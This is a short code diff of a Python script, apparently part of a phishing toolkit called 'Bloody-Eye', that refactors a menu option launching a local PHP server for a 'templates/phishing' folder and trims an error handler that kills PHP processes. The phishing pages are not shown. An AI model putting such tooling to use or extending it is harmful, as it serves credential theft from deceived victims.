@@ -545,12 +545,9 @@ exit();""")
     print("")
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
-       # - - - - - - - - - - -- - - - - - - - - - - - - - - -
-       def deafult_server():
-           with open("log","w") as deafult:
-              Popen(('php','-S','localhost:6060','-t','../Bloody-Eye/templates/phishing'),stderr=phplog,stdout=phplog)
-           print("hahahaha")
-       deafult_server()
+       with open("log","w") as deafult:
+          Popen(('php','-S','localhost:6060','-t','../Bloody-Eye/templates/phishing'),stderr=phplog,stdout=phplog)
+       print("hahahaha")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     elif v == "02":
       with open("log","w") as phplog:
@@ -617,8 +614,7 @@ exit();""")
   except:
     with open("exit","w") as kill:
       Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-      print("uhahahahahahahahahahahahahhahahaahah")
-      time.sleep(5)
+  
       os.system("clear")
       sys.exit()
 
